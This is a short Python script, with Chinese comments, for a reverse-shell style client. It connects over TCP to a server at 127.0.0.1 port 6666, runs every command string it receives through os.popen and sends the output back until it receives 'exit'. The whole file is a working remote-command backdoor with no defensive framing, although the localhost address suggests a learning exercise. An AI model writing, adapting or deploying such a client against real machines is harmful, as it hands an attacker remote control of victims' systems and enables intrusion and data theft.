from socket import *
from os import popen

#客户端接收执行命令

c=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
c.connect(('127.0.0.1',6666))#连接地址
while True:

    cmd=c.recv(10240)
    cmdstr=cmd.decode()
    if cmdstr=='exit':
        c.close()
        break
    try:
        result=popen(cmdstr).read()
        if result == '':
            result='[-] ERROR_COMMAND'
    except:
        result='[-] ERROR_COMMAND'
    c.send(result.encode())
